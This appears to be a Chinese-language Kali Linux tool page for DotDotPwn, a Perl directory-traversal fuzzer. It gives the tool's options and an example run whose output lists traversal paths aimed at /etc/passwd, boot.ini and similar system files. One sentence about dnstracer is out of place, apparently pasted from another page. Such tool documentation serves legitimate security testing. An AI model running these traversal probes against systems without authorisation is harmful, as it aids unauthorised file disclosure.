---
title: DotDotPwn
categories: Information Gathering
tags: [kali linux,dotdotpwn,information gathering,recon,http,exploitation tools]
date: 2016-10-22 14:00:00
---
0x00 DotDotPwn介绍
-------------

DotDotPwn是一个非常灵活的智能模糊器，用于发现软件中的遍历目录漏洞，例如HTTP/FTP/TFTP服务器，Web平台的应用程序（如CMS，ERP，博客等）。

此外，它有一个独立于协议的模块，用于将所需的有效负载发送到指定的主机和端口。 另一方面，它也可以使用STDOUT模块以脚本方式使用。

DotDotPwn是用perl编程语言编写的，可以在* NIX或Windows平台下运行，它是BackTrack Linux（BT4 R2）中包含的第一个墨西哥人开发的工具。

此版本支持的模糊模块：

dnstracer用于获取给定主机名从给定域名服务器（DNS）的信息，并跟随DNS服务器链得到权威结果。
```plain
HTTP
HTTP URL
FTP
TFTP
Payload (Protocol independent)
STDOUT
```

工具来源：https://github.com/wireghoul/dotdotpwn



[DotDotPwn主页][1] | [Kali DotDotPwn Repo仓库][2]



 - 作者：chr1x, nitr0us

 - 证书：GPLv2



0x01 DotDotPwn功能
---------------

dotdotpwn.pl - DotDotPwn - 目录遍历模糊器

```shell
root@kali:~# dotdotpwn
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                               - DotDotPwn v3.0 -                              #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################

用法: ./dotdotpwn.pl -m <模块> -h <主机名> [选项]
	可用选项:
	-m	模块 [http | http-url | ftp | tftp | payload | stdout]
	-h	主机名
	-O	智能模糊探测操作系统 (nmap模块)
	-o	操作系统类型已知("windows", "unix" 或者 "generic")
	-s	服务版本检测(banner信息抓取)
	-d	遍历深度 (e.g. 深度3为 ../../../; 默认: 6)
	-f	特定文件名（例如/etc/motd; 默认：根据检测到的操作系统设置，配置文件TraversalEngine.pm）
	-E	向TraversalEngine.pm添加 @Extra_files文件(例如：web.config, httpd.conf等)
	-S	使用SSL - 对于HTTP和Payload模块（在http-uri的url中使用https://）
	-u	要标记网址中遍历的部分(例如：http://foo:8080/id.php?x=TRAVERSAL&y=31337)
	-k	要在响应中匹配的文字模式（http-url和载荷模块 - 例如，如果尝试/etc/passwd，则需要root权限）
	-p	要发送的有效负载的文件名和要进行模糊处理的部分用TRAVERSAL关键字标记
	-x	连接端口 (默认: HTTP=80; FTP=21; TFTP=69)
	-t	每次测试之间的时间（毫秒，默认: 300 )
	-X	一旦发现漏洞，使用二分法算法检测确切的深度
	-e	附加在每个fuzz字符串末尾的文件扩展名 (例如： ".php", ".jpg", ".inc")
	-U	用户名 (默认: 'anonymous')
	-P	密码 (默认: 'dot@dot.pwn')
	-M	HTTP使用'http'模块时请求方式[GET | POST | HEAD | COPY | MOVE] (default: GET)
	-r	报告文件名 (默认: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')
	-b	在找到第一个漏洞后中断
	-q	安静模式（不打印每次尝试）
	-C	如果未从主机接收到数据则继续
```


<!--more-->


0x02 DotDotPwn用法示例
-----------------

```shell
root@kali:~# dotdotpwn -m http -O -s -S -h www.hackfun.org
#################################################################################
#                                                                               #
#  CubilFelino                                                       Chatsubo   #
#  Security Research Lab              and            [(in)Security Dark] Labs   #
#  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
#                                                                               #
#                               pr0udly present:                                #
#                                                                               #
#  ________            __  ________            __  __________                   #
#  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
#   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
#   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
#  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
#          \/                      \/                                      \/   #
#                               - DotDotPwn v3.0 -                              #
#                         The Directory Traversal Fuzzer                        #
#                         http://dotdotpwn.sectester.net                        #
#                            dotdotpwn@sectester.net                            #
#                                                                               #
#                               by chr1x & nitr0us                              #
#################################################################################

[+] Report name: Reports/www.hackfun.org_10-23-2016_23-42.txt

[========== TARGET INFORMATION ==========]
[+] Hostname: www.hackfun.org
[+] Detecting Operating System (nmap) ...
[+] Operating System detected: 
[+] Protocol: http
[+] Port: 443
[+] Service detected:
nginx
[=========== TRAVERSAL ENGINE ===========]
[+] Creating Traversal patterns (mix of dots and slashes)
[+] Multiplying 6 times the traversal patterns (-d switch)
[+] Creating the Special Traversal patterns
[+] Translating (back)slashes in the filenames
[+] Adapting the filenames according to the OS type detected (generic)
[+] Including Special sufixes
[+] Traversal Engine DONE ! - Total traversal tests created: 19680

[=========== TESTING RESULTS ============]
[+] Ready to launch 3.33 traversals per second
[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)

[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../etc/passwd
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../etc/issue
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../boot.ini
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../windows/system32/drivers/etc/hosts
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../etc/passwd
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../etc/issue
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../boot.ini
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../windows/system32/drivers/etc/hosts
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../etc/issue
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../boot.ini
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../windows/system32/drivers/etc/hosts
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../boot.ini
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../windows/system32/drivers/etc/hosts
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../boot.ini
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../windows/system32/drivers/etc/hosts
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../etc/passwd
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../etc/issue
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../boot.ini
[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../windows/system32/drivers/etc/hosts
...
...
```


  [1]: http://dotdotpwn.blogspot.ca/
  [2]: http://git.kali.org/gitweb/?p=packages/dotdotpwn.git;a=summary